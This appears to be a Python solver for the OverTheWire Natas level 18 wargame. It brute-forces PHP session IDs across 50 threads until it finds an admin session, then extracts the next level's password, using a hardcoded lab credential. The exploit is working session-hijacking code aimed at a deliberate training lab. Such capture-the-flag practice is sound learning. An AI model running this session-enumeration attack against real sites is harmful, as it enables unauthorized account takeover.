if __name__ == '__main__':
    import requests
else:
    from common import *

import concurrent.futures

DONE = False

def test_id(session_id):
    global DONE
    if DONE:
        return False, ''
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,he;q=0.8',
        'Authorization': 'Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Cookie': f'PHPSESSID=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
    }
    headers['Cookie'] = f'PHPSESSID={session_id}'
    result = requests.get('http://natas18.natas.labs.overthewire.org/index.php', headers=headers)
    if 'Login as an admin' not in result.text:
        start = result.text.find('Password: ')
        password = result.text[start+len('Password: '):result.text.find('</pre>', start)]
        DONE = True
        return True, password
    return False, ''

def solve(driver, _ = None):
    
    password = ''
    # for i in range(640):
    # # for _ in range(1):
    # #     i = 119
        
    #     print(i, end = '\r')
    #     headers['Cookie'] = f'PHPSESSID={i}'
    #     result = requests.get('http://natas18.natas.labs.overthewire.org/index.php', headers=headers)
    #     if 'Login as an admin' not in result.text:
    #         start = result.text.find('Password: ')
    #         password = result.text[start+len('Password: '):result.text.find('</pre>', start)]
    #         break
    # else:
    #     print()
    #     raise Exception('No solving session id found')
    
    # threaded
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as pool:
        results = pool.map(test_id, range(640))
        # pool.shutdown(wait=True)
        
    for result in results:
        if result[0]:
            password = result[1]
            break
    else:
        raise Exception('No solving session id found')
    
    print()
    if driver: driver.get(build_url(password = password, level=19))
    return password


if __name__ == '__main__':
    print(solve(None))